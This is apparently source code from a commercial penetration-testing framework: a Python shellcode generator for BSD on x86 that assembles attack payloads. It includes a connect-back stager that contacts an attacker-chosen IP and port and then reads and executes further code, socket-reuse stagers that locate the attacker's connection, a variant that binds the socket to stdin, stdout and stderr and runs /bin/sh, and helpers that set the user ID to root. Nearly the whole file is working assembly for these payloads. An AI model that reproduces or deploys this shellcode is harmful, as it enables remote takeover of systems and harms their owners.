#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
linux x86 shellcode generator
"""

from x86shellcodegenerator import X86
from exploitutils import *
from MOSDEF import mosdef

class bsd_X86(X86):
    def __init__(self):
        X86.__init__(self)
        
        self.handlers["GOFindSock"]=self.GOFindSock
        self.handlers["exit"]=self.exitshellcode
        self.handlers["dup2"]=self.dup2
        self.handlers["setuid"]=self.setuid
        self.handlers["setreuid"]=self.setreuid
        self.handlers["sendreg"]=self.sendreg
        self.handlers["read_and_exec"]=self.read_and_exec
        self.handlers["read_and_exec_loop"]=self.read_and_exec_loop
        self.handlers["connect"]=self.connect
        self.handlers["whileone"]=self.whileone

        self.syscalls={}
        self.syscalls["SYS_socket"]=0x61
        self.syscalls["SYS_connect"]=0x62
        self.syscalls["SYS_read"]=0x3

        self.exitcode="\nexitshellcode:\n" #nothing here (probably a bad idea)
        return
    
    def finalize(self):
        """
        FreeBSD Finalize:
          o Adds an exitshellcode if used
          
        """
        #print "Finalize called..."
        self.code+=self.exitcode
        self.value=mosdef.assemble(self.code,"X86")
        return self.value
    
    def createsocket(self,args):
        """
        Calls socket() and leaves result in eax
        
        Does not add to self.value, instead, returns result in code
        """
        IPPROTO_IP=0
        SOCK_STREAM=1
        AF_INET=2
        SOCK_DATAGRAM=17 #make sure this is right.
        
        if "protocol" in args:
            protocol=args["protocol"]
        else:
            protocol=IPPROTO_IP
        if "type" in args:
            type=args["type"]
        else:
            type=SOCK_STREAM
        if "domain" in args:
            domain=args["domain"]
        else:
            domain=AF_INET
            
        code="""
        pushl $PROTOCOL
        pushl $TYPE
        pushl $DOMAIN
        pushl %eax //pad for BSD
        movl $SYSCALLNUMBER, %eax 
        int $0x80
        jb exitshellcode
        addl $12,%esp //restore the stack
        //eax is the new socket handle
        """

        code=code.replace("PROTOCOL",str(protocol))
        code=code.replace("TYPE",str(type))
        code=code.replace("DOMAIN",str(domain))
        code=code.replace("SYSCALLNUMBER",str(self.syscalls["SYS_socket"]))
        return code

    def exitshellcode(self,args):
        self.exitcode="""
        exitshellcode:
        push $0 //errorcode of 0 (success)
        movl $1,%eax //sys_exit
        push %eax //dummy argument for BSD fun
        int $0x80
        """
        return
    
    def socket(self,args):
        """
        socket() - changes self.value to create a socket in %eax
        """
        socketcode=self.createsocket(args)
        self.code+=socketcode
        bin=mosdef.assemble(socketcode,"X86")
        self.value+=bin
        return bin

    def ignore_signals(self,args):
        """
        Ignore signals sent to me...reset them to default
        """
        code="""
        
        
        """
        
    def set_sock_blocking(self,args):
        #for now, assume socket is in ebx
        #we destroy any other attributes on the socket in this version
        code="""
        //basically this:
        //opts=0
        //fcntl(sock,F_SETFL,opts);
        //fcntl is syscall3(55,...)
        movl $55,%eax
        //sock is already in ebx
        movl $4, %ecx
        xorl %edx, %edx
        int  $0x80
        //hopefully that didn't hurt ebx
        """
        bin=mosdef.assemble(code,"X86")
        self.value+=bin
        return bin

    def hikiwaza_connectback(self, args):
        """
        'Smaller' connectback that remains untouched for hikiwaza
        """
        if "ipaddress" not in args:
            print "No ipaddress passed to connect !"
        if "port" not in args:
            print "no port in args of connect !"

        ipaddress = args["ipaddress"]
        port = args["port"]

        code="""
start:

  //WARNING: no error checking whatsoever due to size
  xorl %ecx,%ecx
  xorl %ebx,%ebx
  xorl %eax,%eax
  movb $0x17,%al
  int $0x80
  xorl %eax,%eax
  movb $0x46,%al
  int $0x80

  //socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
  xorl %eax,%eax
  pushl %eax
  popl %ebx
  pushl %eax
  popl %ecx
  movb $6,%al
  pushl %eax
  movb $1,%al
  pushl %eax
  movb $2,%al
  pushl %eax
  movl %esp,%ecx
  movb $1,%bl
  movb $102,%al
  int $0x80

  //connect(socket, struct sockaddr, 16)
connect:
  movl %eax,%esi
  xorl %eax,%eax
  pushl %eax
  popl %ebx
  //build the sockaddr struct
  pushl %eax
  pushl %eax

  //IP
  pushl $IPADDRESS
  //PORT
  pushw $PORT
  pushw $0x0002
  movl %esp,%edx
  // push the args
  movb $16,%al
  pushl %eax
  pushl %edx
  pushl %esi
  movl %esp,%ecx
  movb $3,%bl
  movb $102,%al
  int $0x80
  test %eax,%eax
  jnz connect

  //%esi has our fd
  xorl %eax,%eax
  xorl %edx,%edx
  //read the first 4 bytes..len value
  movb $4,%dl
  movl %esp,%ecx
  movl %esi,%ebx
  movb $3,%al
  int $0x80
  movl (%esp),%edi
  //our total len is in %edi..let the games begin
  //wanna read into pcloc
  jmp read_here
getmyloc:
  //copy to modify
  pushl (%esp)

readexecloop:
  xorl %eax,%eax
  movl %edi,%edx
  movl (%esp),%ecx
  movb $3,%al
  int $0x80
  cmpl %edi,%eax
  je execute
  subl %eax,%edi
  add %eax,(%esp)
  jmp readexecloop

execute:
  //jmp to execute .. ebx has the fd
  popl %esi
  popl %esi
  jmp *%esi

read_here:
call getmyloc

end:
        """
        code = code.replace("IPADDRESS", uint32fmt(istr2int(socket.inet_aton(socket.gethostbyname(ipaddress)))))
        code = code.replace("PORT", uint16fmt(byteswap_16(port)))
        bin = mosdef.assemble(code, "X86")
        self.value += bin
        return bin
        

    
    def connect(self,args):
        """
        Connectback code
        Leaves current socket FD in ebx
        """
        if "ipaddress" not in args:
            print "No ipaddress passed to connect!!!"
        if "port" not in args:
            print "no port in args of connect"
        ipaddress=args["ipaddress"]
        port=args["port"]
        #print type(port)
        socketcode=self.createsocket([ipaddress,port])
        #now our socket is in %eax
        connectcode="""
        movl %eax, %ebx //save socket into %ebx
        pushl $IPADDRESS //host
        pushw $PORT //port 5555
        pushw $0x02b4 //constant
        movl %esp, %esi //store off sock_addr_in struct addr
        pushl $0x10 //size of structure
        pushl %esi //address of structure
        pushl %ebx //socket fd
        mov $SYSCALLNUMBER, %eax //sys_connect
        push %eax //dummy argument for BSD fun
        int $0x80
        jb exitshellcode
        """
        connectcode=connectcode.replace("IPADDRESS", uint32fmt(istr2int(socket.inet_aton(socket.gethostbyname(ipaddress)))))
        connectcode=connectcode.replace("PORT", uint16fmt(byteswap_16(port)))
        connectcode=connectcode.replace("SYSCALLNUMBER",str(self.syscalls["SYS_connect"]))

        self.code+=socketcode+connectcode
        return self.code
    
    def whileone(self, args):
        code="""
        jmp $-2
        """
        bin=mosdef.assemble(code,"X86")
        self.value+=bin
        return bin
    
    def GOFindSock(self,args):
        """
        the new default Linux GO code (NAT friendly)
        
        this one does 1024 fd's in one go, thus preventing
        high FD segment search timeouts on laggy connections
        it's generally more clean and robust
        """
        code = """

// a small GO code (does 0-1024 fd)
// indented for her pleasure

start:

    // ignore SIGPIPE
    xorl    %ecx,%ecx
    xorl    %ebx,%ebx
    xorl    %eax,%eax
    movb    $13,%bl  
    incl    %ecx     
    movb    $48,%al  
    int     $0x80    

gofindsock:
    // the bitmask we maintain
    xorl    %eax,%eax
    xorl    %ecx,%ecx
    movb    $32,%cl  

pushmask:
    pushl   %eax
    loop    pushmask
    
    // push fd count
    movw    $1024,%cx
    pushl   %ecx

    // save base
    movl    %esp,%esi

check_fds:
    xorl    %ebx,%ebx
    decl    %ebx
    xorl    %eax,%eax
    // start at 1024, real start 1023
    decl    (%esi)

    // -1 ? done
    cmpl    (%esi),%ebx
    je      bitmask_done

    xorl    %ecx,%ecx
    movb    $5,%cl   

pusharg:
    pushl   %eax
    loop    pusharg
    
    movl    %esp,%edi

    movb    $0x10,%al
    movl    %eax,16(%edi)
    // socklen_t *namelen
    leal    16(%edi),%ecx
    pushl   %ecx
    pushl   %edi

    xorl    %ebx,%ebx
    movb    $7,%bl

    movb    $102,%al 
    // push fd count 
    pushl   (%esi)   
    movl    %esp,%ecx
    int     $0x80    

    // get result    
    movl    (%edi),%eax
    cmpb    $10,%al
    je      trigger
    cmpb    $2,%al
    je      trigger  
    
    movl    %esi,%esp
    jmp     check_fds

trigger:
    // reset to base
    movl    %esi,%esp
    
    xorl    %eax,%eax
    xorl    %ecx,%ecx
    movb    $0x47,%cl
    pushl   %ecx
    movl    %esp,%ecx
    pushl   %eax
    incl    %eax
    pushl   %eax
    pushl   %ecx
    pushl   (%esi)   
    movl    %esp,%ecx
    xorl    %eax,%eax
    xorl    %ebx,%ebx
    movb    $9,%bl
    movb    $102,%al   
    int     $0x80

    // reset to base 
    movl    %esi,%esp
    cmpb    $1,%al
    jne     check_fds
    
    // add to mask 
    // start of first dword in mask
    leal    4(%esi),%edi
    movl    (%esi),%ecx
    xorl    %eax,%eax
    xorl    %ebx,%ebx
    xorl    %edx,%edx
    movb    $32,%al
    movb    $4,%dl
    incl    %ebx

    // first find the right dword in the mask
    //int3

index_mask:
    cmpl    %eax,%ecx
    jge     up_index 

    // we're at the right word, bit to set is in %ecx
shift_it:
    test    %ecx,%ecx
    jz      zero_fd
    shll    $1,%ebx
    loop    shift_it
zero_fd:
    // or in the right bit
    orl     %ebx,(%edi)
    
    jmp     check_fds

up_index:
    subl    %eax,%ecx
    addl    %edx,%edi
    jmp     index_mask

bitmask_done:

    // call select on our mask

    xorl    %ebx,%ebx
    movw    $1024,%bx
    leal    4(%esi),%ecx
    xorl    %edx,%edx
    pushl   %esi     
    xorl    %esi,%esi
    // timeout
    pushl   %edx
    pushl   $4
    movl    %esp,%edi  
    xorl    %eax,%eax
    movb    $142,%al
    int     $0x80    
    // restore base ref
    movl    8(%esp),%esi
    
    test    %eax,%eax
    jz      restart
    
    // check result
    //int3
    leal    4(%esi),%esp
    xorl    %ecx,%ecx
    xorl    %ebx,%ebx
    popl    %edi   
    //int3

loop_mask:

    cmpb    $32,%bl
    jne     nopop
    popl    %edi
    xorl    %ebx,%ebx
nopop:
    // shift right ! 
    shrl    $1,%edi
    jc      check_trigger
notrigger:
    incl    %ecx
    cmpw    $1024,%cx
    je      restart
    incl    %ebx
    jmp     loop_mask
    
check_trigger:
    pushl   %esp
    pushl   %ebx
    pushl   %ecx

    // got a return fd in ecx
    xorl    %eax,%eax
    pushl   %eax
    movl    %esp,%edx
    pushl   %eax
    incl    %eax
    pushl   %eax
    pushl   %edx
    pushl   %ecx
    xorl    %ebx,%ebx
    movb    $10,%bl
    movl    %esp,%ecx
    movb    $102,%al 
    int     $0x80

    addl    $20,%esp
    popl    %ecx
    popl    %ebx
    popl    %esp

    movl    (%edx),%eax
    cmpb    $0x4f,%al  
    je      trigger_success
    
    jmp     notrigger
    
restart:
    addl    $128,%esi
    movl    %esi,%esp
    jmp     gofindsock  

trigger_success:
    // sleep a little to make sure len value is on the wire
    // we're not using select etc. anymore because we're in
    // a predictable world now

    // NANOSLEEP PATCH
    pushl %ecx
    xorl %eax,%eax
    xorl %ebx,%ebx
    xorl %ecx,%ecx
    pushl %ebx
    movb $2,%bl // wait 2 seconds
    pushl %ebx
    movl %esp,%ebx
    movb $162,%al 
    int $0x80 
    popl %eax 
    popl %eax
    popl %ecx
    //done nanosleep
    
    // fd in %ecx 
    movl    %ecx,%ebx
    xorl    %eax,%eax
    xorl    %edx,%edx
    // read the first 4 bytes..len value
    movb    $4,%dl
    movl    %esp,%ecx
    movb    $3,%al
    int     $0x80    
    cmpb    $0xff,%ah
    // jmp to exit on -1 
    je      trigger_success
    movl    (%esp),%edi
 
       // our total len is in %edi..let the games begin
       // wanna read into pcloc
       jmp read_here
getmyloc:
        // copy to modify
        pushl (%esp)
readexecloop:
        xorl %eax,%eax
        movl %edi,%edx
        movl (%esp),%ecx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        cmpl %edi,%eax
        je execute
        subl %eax,%edi
        add %eax,(%esp)
        jmp readexecloop

execute:
        // jmp to execute .. ebx has the fd
        popl %esi
        popl %esi
        jmp *%esi

exit:
        xorl %ebx,%ebx
        xorl %eax,%eax
        incb %al
        int $0x80

read_here:
       call getmyloc

end:

     """
        bin=mosdef.assemble(code, "X86")
        # this code is mostly used standalone
        self.value += bin
        return

    def GOFindSockSegment(self,args):
        """
        Linux GO code NAT friendly socket recycling
        this one can search any fd range (allthough this is mostly
        limited by select itself) using fd indexing and 32 fd
        bitmask segmenting
        """
        code = """
start:
        // ignore SIGPIPE
        xorl %ecx,%ecx
        xorl %ebx,%ebx
        xorl %eax,%eax
        movb $13,%bl // SIGPIPE
        incb %cl // SIGN_IGN
        movb $48,%al
        int $0x80

        // %edi --> global fd index
        xorl %edi,%edi
        // %esi --> global fd count
        xorl %esi,%esi

        jmp baseindex

up_fd_index:
        // indicates the next 32 fds
        incl %edi
baseindex:
        xorl %eax,%eax
        // segment bitmask
        pushl %eax
        // internal 32 range fd count
        pushl %eax

getpeer:
        // check 32 fd range
        // if AF_INET or AF_INET6, send trigger
        // and add to bitmask
        xorl %eax,%eax
        xorl %ebx,%ebx

        movb $0x10,%bl
        pushl %ebx
        // socklen_t *namelen
        movl %esp,%edx

        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax
        // struct sockaddr *name
        movl %esp,%ecx

        // push args
        pushl %edx
        pushl %ecx
        // %esi holds fd
        pushl %esi

        // args
        movl %esp,%ecx
        // getpeername
        movb $7,%bl
        // socket call
        movb $102,%al
        int $0x80
        // reset stackpointer to point to result
        addl $12,%esp
        popl %eax
        // reset stackpointer for rest junk
        addl $16,%esp
        // check for AF_INET6
        cmpb $10,%al
        je send_trigger
        // check for AF_INET
        cmpb $2,%al
        je send_trigger  

        jmp next_fd   

send_trigger:

        // 'G'
        pushl $0x47474747
        // flags
        xorl %eax,%eax
        pushl %eax
        // len
        incl %eax
        pushl %eax
        // *msg
        xorl %ecx,%ecx
        leal 8(%esp),%ecx
        pushl %ecx
        // s
        pushl %esi
        // args
        movl %esp,%ecx
        // send   
        xorl %ebx,%ebx
        movb $9,%bl
        movb $102,%al
        int $0x80
        // reset stackpointer
        addl $20,%esp
        // anything but 1 is failure
        cmpb $1,%al   
        je send_success

        jmp next_fd   

send_success:
        // get the internal fd count
        popl %eax
        // get the internal bitmask
        popl %ebx 
        // get the to or value into %ecx
        xorl %ecx,%ecx
        movl %eax,%edx

        incl %ecx
shiftloop:
        test %edx,%edx
        jz shiftdone
        shll $1,%ecx
        decl %edx 
        jmp shiftloop

shiftdone:
        // or it into the bitmask
        orl %ecx,%ebx
        // save the internal bitmask
        pushl %ebx   
        // save the internal fd count
        pushl %eax
        
next_fd:
        // up internal count
        popl %eax
        incl %eax
        pushl %eax  
        // next fd
        incl %esi
        
        // MAX FD CHECK HERE!
        cmpl $1024,%esi
        je max_fd_reached

        // get internal count
        popl %eax
        // also get old bitmask
        popl %ebx
        cmpb $32,%al
        // do_select will jmp back to up_fd_index if we need to handle
        // a next fd segment
        je do_select
        pushl %ebx
        pushl %eax
        jmp getpeer

do_select:
        // %ebx still holds bitmask
        // check if we actually need to call select
        test %ebx,%ebx
        jz up_fd_index

        // save global fd count
        pushl %esi
        // save global fd index
        pushl %edi   
        
        // ok so we have a 32fd bitmask in %ebx
        // the actual fd will be fd in bitmask + global fd index*32
        // so on building our actual bitmask we need to prepend
        // that amount of NULL masks, %esi already holds max fd + 1

        // save esp
        movl %esp,%edx

        // build the mask
        xorl %eax,%eax
        // our actual mask
        pushl %ebx
        // get the needed prepend NULL masks
buildmask:
        test %edi,%edi
        jz finishmask 
        decl %edi
        pushl %eax
        jmp buildmask
finishmask:
        // n
        movl %esi,%ebx
        // *readfds
        movl %esp,%ecx
        // save saved esp
        pushl %edx
        // NULL
        xorl %edx,%edx
        // NULL  
        xorl %esi,%esi
        // SET SELECT TIMEOUT HERE!
        // timeout 4 secs before next segment
        // edi is already 0
        pushl %edi
        movb $4,%al
        pushl %eax
        movl %esp,%edi
        // call select(2)
        movb $142,%al
        int $0x80
        
        // restore old %esp from save
        popl %ecx
        popl %ecx   
        popl %ecx

        // restore fd count and global index
        movl (%ecx),%edi
        movl 4(%ecx),%esi  

        // restore our actual bitmask
        movl (%esp,%edi,4),%ebx

        // actually restore %esp
        movl %ecx,%esp 

        // compensate for edi and esi pushl
        popl %ecx
        popl %ecx
        
        // if return from select == 0, timeout, next segment
        // we can check here if we wish, do we wish?
        // doesn't really matter as the mask will have 0 readable fd's

        // so now we have a result mask for our segment  
        // we can calculate the actual fd via our global index
        // remember fd count starts at zero
        
        xorl %eax,%eax
        movb $32,%al

rloop:
        // this decl takes into account fd count starts at zero
        // as we initialised %eax to 32
        decl %eax
        // if we're out of fd's in the mask we go to a next segment
        cmpl $-1,%eax
        je up_fd_index
        // shift left 1, if carry set fd in eax is readable
        shll $1,%ebx
        jnc rloop

        // save bitmask
        pushl %ebx
        // save rloop index
        pushl %eax 

        // alrighty we have a readable fd
        // calculate the real fd value using
        // our index

        movl %edi,%ebx
        
calcfd:
        test %ebx,%ebx
        jz gotrealfd
        addl $32,%eax
        decl %ebx
        jmp calcfd

gotrealfd:
        // now we have our real readable fd value in %eax
        // so now we can receive a possible trigger response
        pushl $0x41414141
        movl %esp,%ecx
        xorl %edx,%edx
        // flags
        pushl %edx
        // len
        incl %edx
        pushl %edx
        // %buf
        pushl %ecx
        // s
        pushl %eax
        xorl %ebx,%ebx
        movb $10,%bl
        movl %esp,%ecx
        xorl %eax,%eax
        movb $102,%al
        int $0x80
        // anything but 1 return is failure
        cmpb $1,%al
        je checktrigger

        // failed, restore stackpointer
        addl $20,%esp
        // restore rloop index
        popl %eax   
        // restore bitmask
        popl %ebx
        jmp rloop
        
checktrigger:
        // restore fd
        popl %eax
        // eat junk from stack
        popl %ebx
        popl %ebx
        popl %ebx   
        // eat recv stack
        popl %ebx

        // check for trigger response 'O'
        cmpb $0x4f,%bl
        je foundtrigger

        // if no trigger we handle
        // the other fds in our mask

        // restore rloop index
        popl %eax
        // restore bitmask
        popl %ebx 

        jmp rloop  

foundtrigger:
        // we have a trigger! active fd is in %eax
        movl %eax,%esi
        
readexec:
        // %esi has our fd ..insert whatever the heck you wanna do to it here
        xorl %eax,%eax
        xorl %edx,%edx
        // read the first 4 bytes..len value
        movb $4,%dl
        movl %esp,%ecx
        movl %esi,%ebx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        // jmp to exit on -1
        je max_fd_reached
        movl (%esp),%edi
        // our total len is in %edi..let the games begin

        // wanna read into pcloc for non exec stack
        jmp read_here
getmyloc:
        // copy to modify
        pushl (%esp)
readexecloop:
        xorl %eax,%eax
        movl %edi,%edx
        movl (%esp),%ecx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        cmpl %edi,%eax
        je execute
        subl %eax,%edi
        add %eax,(%esp)
        jmp readexecloop

execute:
        // jmp to execute .. ebx has the fd
        popl %esi
        popl %esi
        jmp *%esi

exit:
        xorl %ebx,%ebx
        xorl %eax,%eax
        incb %al
        int $0x80

read_here:
        call getmyloc
end:
        """
        bin=mosdef.assemble(code, "X86")
        # this code is mostly used standalone
        self.value += bin
        return
        
    def GOFindSockWithShell(self,args):
        """
        Linux GO code NAT friendly socket recycling
        this one can search any fd range (allthough this is mostly
        limited by select itself) using fd indexing and 32 fd
        bitmask segmenting
        """
        code = """
start:
        // ignore SIGPIPE
        xorl %ecx,%ecx
        xorl %ebx,%ebx
        xorl %eax,%eax
        movb $13,%bl // SIGPIPE
        incb %cl // SIGN_IGN
        movb $48,%al
        int $0x80

        // %edi --> global fd index
        xorl %edi,%edi
        // %esi --> global fd count
        xorl %esi,%esi

        jmp baseindex

up_fd_index:
        // indicates the next 32 fds
        incl %edi
baseindex:
        xorl %eax,%eax
        // segment bitmask
        pushl %eax
        // internal 32 range fd count
        pushl %eax

getpeer:
        // check 32 fd range
        // if AF_INET or AF_INET6, send trigger
        // and add to bitmask
        xorl %eax,%eax
        xorl %ebx,%ebx

        movb $0x10,%bl
        pushl %ebx
        // socklen_t *namelen
        movl %esp,%edx

        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax
        // struct sockaddr *name
        movl %esp,%ecx

        // push args
        pushl %edx
        pushl %ecx
        // %esi holds fd
        pushl %esi

        // args
        movl %esp,%ecx
        // getpeername
        movb $7,%bl
        // socket call
        movb $102,%al
        int $0x80
        // reset stackpointer to point to result
        addl $12,%esp
        popl %eax
        // reset stackpointer for rest junk
        addl $16,%esp
        // check for AF_INET6
        cmpb $10,%al
        je send_trigger
        // check for AF_INET
        cmpb $2,%al
        je send_trigger  

        jmp next_fd   

send_trigger:

        // 'G'
        pushl $0x47474747
        // flags
        xorl %eax,%eax
        pushl %eax
        // len
        incl %eax
        pushl %eax
        // *msg
        xorl %ecx,%ecx
        leal 8(%esp),%ecx
        pushl %ecx
        // s
        pushl %esi
        // args
        movl %esp,%ecx
        // send   
        xorl %ebx,%ebx
        movb $9,%bl
        movb $102,%al
        int $0x80
        // reset stackpointer
        addl $20,%esp
        // anything but 1 is failure
        cmpb $1,%al   
        je send_success

        jmp next_fd   

send_success:
        // get the internal fd count
        popl %eax
        // get the internal bitmask
        popl %ebx 
        // get the to or value into %ecx
        xorl %ecx,%ecx
        movl %eax,%edx

        incl %ecx
shiftloop:
        test %edx,%edx
        jz shiftdone
        shll $1,%ecx
        decl %edx 
        jmp shiftloop

shiftdone:
        // or it into the bitmask
        orl %ecx,%ebx
        // save the internal bitmask
        pushl %ebx   
        // save the internal fd count
        pushl %eax
        
next_fd:
        // up internal count
        popl %eax
        incl %eax
        pushl %eax  
        // next fd
        incl %esi
        
        // MAX FD CHECK HERE!
        cmpl $0xffff,%esi
        je max_fd_reached

        // get internal count
        popl %eax
        // also get old bitmask
        popl %ebx
        cmpb $32,%al
        // do_select will jmp back to up_fd_index if we need to handle
        // a next fd segment
        je do_select
        pushl %ebx
        pushl %eax
        jmp getpeer

do_select:
        // %ebx still holds bitmask
        // check if we actually need to call select
        test %ebx,%ebx
        jz up_fd_index

        // save global fd count
        pushl %esi
        // save global fd index
        pushl %edi   
        
        // ok so we have a 32fd bitmask in %ebx
        // the actual fd will be fd in bitmask + global fd index*32
        // so on building our actual bitmask we need to prepend
        // that amount of NULL masks, %esi already holds max fd + 1

        // save esp
        movl %esp,%edx

        // build the mask
        xorl %eax,%eax
        // our actual mask
        pushl %ebx
        // get the needed prepend NULL masks
buildmask:
        test %edi,%edi
        jz finishmask 
        decl %edi
        pushl %eax
        jmp buildmask
finishmask:
        // n
        movl %esi,%ebx
        // *readfds
        movl %esp,%ecx
        // save saved esp
        pushl %edx
        // NULL
        xorl %edx,%edx
        // NULL  
        xorl %esi,%esi
        // SET SELECT TIMEOUT HERE!
        // timeout 4 secs before next segment
        // edi is already 0
        pushl %edi
        movb $4,%al
        pushl %eax
        movl %esp,%edi
        // call select(2)
        movb $142,%al
        int $0x80
        
        // restore old %esp from save
        popl %ecx
        popl %ecx   
        popl %ecx

        // restore fd count and global index
        movl (%ecx),%edi
        movl 4(%ecx),%esi  

        // restore our actual bitmask
        movl (%esp,%edi,4),%ebx

        // actually restore %esp
        movl %ecx,%esp 

        // compensate for edi and esi pushl
        popl %ecx
        popl %ecx
        
        // if return from select == 0, timeout, next segment
        // we can check here if we wish, do we wish?
        // doesn't really matter as the mask will have 0 readable fd's

        // so now we have a result mask for our segment  
        // we can calculate the actual fd via our global index
        // remember fd count starts at zero
        
        xorl %eax,%eax
        movb $32,%al

rloop:
        // this decl takes into account fd count starts at zero
        // as we initialised %eax to 32
        decl %eax
        // if we're out of fd's in the mask we go to a next segment
        cmpl $-1,%eax
        je up_fd_index
        // shift left 1, if carry set fd in eax is readable
        shll $1,%ebx
        jnc rloop

        // save bitmask
        pushl %ebx
        // save rloop index
        pushl %eax 

        // alrighty we have a readable fd
        // calculate the real fd value using
        // our index

        movl %edi,%ebx
        
calcfd:
        test %ebx,%ebx
        jz gotrealfd
        addl $32,%eax
        decl %ebx
        jmp calcfd

gotrealfd:
        // now we have our real readable fd value in %eax
        // so now we can receive a possible trigger response
        pushl $0x41414141
        movl %esp,%ecx
        xorl %edx,%edx
        // flags
        pushl %edx
        // len
        incl %edx
        pushl %edx
        // %buf
        pushl %ecx
        // s
        pushl %eax
        xorl %ebx,%ebx
        movb $10,%bl
        movl %esp,%ecx
        xorl %eax,%eax
        movb $102,%al
        int $0x80
        // anything but 1 return is failure
        cmpb $1,%al
        je checktrigger

        // failed, restore stackpointer
        addl $20,%esp
        // restore rloop index
        popl %eax   
        // restore bitmask
        popl %ebx
        jmp rloop
        
checktrigger:
        // restore fd
        popl %eax
        // eat junk from stack
        popl %ebx
        popl %ebx
        popl %ebx   
        // eat recv stack
        popl %ebx

        // check for trigger response 'O'
        cmpb $0x4f,%bl
        je foundtrigger

        // if no trigger we handle
        // the other fds in our mask

        // restore rloop index
        popl %eax
        // restore bitmask
        popl %ebx 

        jmp rloop  

foundtrigger:
        // we have a trigger! active fd is in %eax
        movl %eax,%esi
        
        // dup2 0,1,2 from fd
        movl %eax,%ebx
        xorl %ecx,%ecx
dup2:
        xorl %eax,%eax
        movb $63,%al
        int $0x80
        incl %ecx
        cmpb $3,%cl
        jne dup2

        // execve /bin/sh
        xorl %eax,%eax
        pushl %eax
        pushl $0x68732f2f
        pushl $0x6e69622f
        movl %esp,%ebx
        pushl %eax
        pushl %ebx
        movl %esp,%ecx
        xorl %edx,%edx
        movb $11,%al
        int $0x80

max_fd_reached:
        // exit(0)  
        xorl %ebx,%ebx
        xorl %eax,%eax
        incb %al
        int $0x80
end:
        """
        bin=mosdef.assemble(code, "X86")
        # this code is mostly used standalone
        self.value += bin
        return
    
    def getdup2ebx(self,fd):
        template="""
        xorl %eax,%eax
        xorl %ecx,%ecx
        movb $FD, %cl
        movb $0x3f,%al
        int $0x80
        """
        code=template.replace("FD","%d"%fd)
        bin=mosdef.assemble(code,"X86")
        return bin
    
    def dup2(self,args):
        """Requires ebx to be the socket handle 
        calls dup2() to set 0,1,2 to that socket
        """
        
        # learned from rsync experience :D
        if args==None:
            print "failed to dup2, no arguments (fd must be given)"
            return
        fd=args[0]
        code="""
        movl $FD,%ebx
        """
        code=code.replace("FD", "%d" % fd)
        bin=mosdef.assemble(code, "X86")
        self.value+= bin
        self.value+= self.getdup2ebx(0)
        self.value+= self.getdup2ebx(1)
        self.value+= self.getdup2ebx(2)
        return
        
    def setuid(self,args):
        """Calls setuid(id) """
        code=""
        if args==None:
            id=0
        else:
            id=args[0]
        code+="""
        pushl $ID
            """
        code=code.replace("ID","%d"%id)
        code+="""
        pushl $0 //null for bsd
        movl $0x17,%eax
        int $0x80
        addl $8, %esp
        """
        self.code+=code
        return
    
    def setreuid(self,args):
        """Calls setreuid(id,id2) """
        code="""

        """
        if args==None:
            id1=0
            id2=0
        else:
            id1=args[0]
            id2=args[1]
        code+="""
        pushl $ID1
        pushl $ID2
        pushl $0 //fake frame
        movl $0x7e,%eax
        int $0x80
        addl $12, %esp
        """
        #replace the id and id1 if necessary
        code=code.replace("ID1",str(id1)).replace("ID2",str(id2))
        self.code+=code
        return
    
    def execve(self,args):
        """
        We could shorten this down even further by allocating space
        on the stack for our pointer tables, instead of including it
        in the shellcode.
        
        If env and args are [] we could do some optimization as well.
        """
        
        filename=args["filename"]
        argv=args["argv"] #list of args
        envp=args["envp"] #list of environment variables
        suffix=""
        code="""
        push %ebx //we destroy this and every other register. Bad us.
        call geteip
geteip:
        pop %ebx
        leal environmentpointers-geteip(%ebx),%edi
        """
        asciinum=0
        pointertable=""
        pointertable+="\nenvironmentpointers:\n"
        for env in envp:
            code+="leal ascii%d-geteip(%%ebx),%%eax"%asciinum
            code+="""            
        movl %eax,(%edi)
        addl $4,%edi
            """
            suffix+="ascii%d:\n"%asciinum
            suffix+=".ascii \"%s\"\n"%env
            suffix+=".byte 0x00\n"
            pointertable+=".long 0x00000000\n"
            asciinum+=1

        #null terminate the env pointer array
        code+="""
        //movl $0,%eax
        //movl %eax,(%edi)
        add $4,%edi
        """
        pointertable+=".long 0x00000000\n"
        
        #load the argv
        code+="""
        leal argpointers-geteip(%ebx), %edi
            """
        pointertable+="argpointers:\n"        
        for arg in argv:
            code+="leal ascii%d-geteip(%%ebx),%%eax"%asciinum
            code+="""            
        movl %eax,(%edi)
        addl $4,%edi
            """
            suffix+="ascii%d:\n"%asciinum
            suffix+=".ascii \"%s\"\n"%arg
            suffix+=".byte 0x00\n"
            pointertable+=".long 0x00000000\n"
            asciinum+=1    
            
        #null terminate the arg pointer array
        code+="""
        //movl $0,%eax
        //movl %eax,(%edi)
        """
        pointertable+=".long 0x00000000\n"
        
        #add filename to suffix
        suffix+="filename:\n.ascii \"%s\"\n"%filename
        suffix+="\n.byte 0x00\n" #null terminator
        
        code+="""
        leal environmentpointers-geteip(%ebx),%edx
        leal argpointers-geteip(%ebx), %ecx
        leal filename-geteip(%ebx), %ebx
        movl $0x0b,%eax //0b is execve - we can make this a variable later.
        int $0x80
        jmp done
            """
        code+=pointertable+suffix
        code+="""
done:
                """
        #print "code=%s"%code
        bin=mosdef.assemble(code,"X86")
        self.value+=bin
        return
    
    def sendreg(self,args):
        """
        Calls send() to send 4 bytes of reg value in little
        endian order to the socket which is in args["fdreg"]
        args[regtosend] and args[fdreg] cannot be eax, ecx
        ESP would also be nonsense in this context
        
        After this is finished, it leaves the fd in FDREG
        
        """
        code="""
        pushl %FDREG
        pushl %REGTOSEND
        movl %esp, %ecx
        xorl %eax,%eax
        pushl %eax //sendto len
        pushl %eax //sendto sockaddr
        pushl %eax //flags of zero
        movb $4,%al
        pushl %eax //length of 4
        pushl %ecx //message 
        pushl %FDREG
        pushl %eax // fake register for BSD fun
        movl $0x85,%al // SYS_sendto (BSD doesn't appear to have SYS_send)
        int $0x80 // send 4 bytes on fd
        addl $32,%esp //reset stack pointer
        popl %FDREG
        """
        code=code.replace("REGTOSEND",args["regtosend"])
        code=code.replace("FDREG",args["fdreg"])
        self.code+=code
        return

    
